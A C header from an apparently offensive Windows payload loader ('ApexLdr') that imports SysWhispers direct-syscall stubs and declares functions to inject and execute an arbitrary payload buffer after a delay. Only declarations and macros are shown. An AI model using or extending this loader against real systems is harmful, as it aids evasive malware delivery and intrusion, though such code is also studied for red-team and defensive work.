#ifndef APEXLDR_INJECT_H
#define APEXLDR_INJECT_H

#include <windows.h>
#include "syswhispers.h"

#define		PAGE_SIZE			4096
#define		SET_TO_MULTIPLE_OF_4096(X)	( ((X) + 4095) & (~4095) )
#define NtCurrentProcess() ((HANDLE)(LONG_PTR)-1)

#define PAYLOAD_EXEC_DELAY      0x0A

BOOL Inject(PBYTE pPayloadBuffer, SIZE_T sPayloadSize, PBYTE* pInjectedPayload);
VOID Execute(PVOID pInjectedPayload);


#endif //APEXLDR_INJECT_H
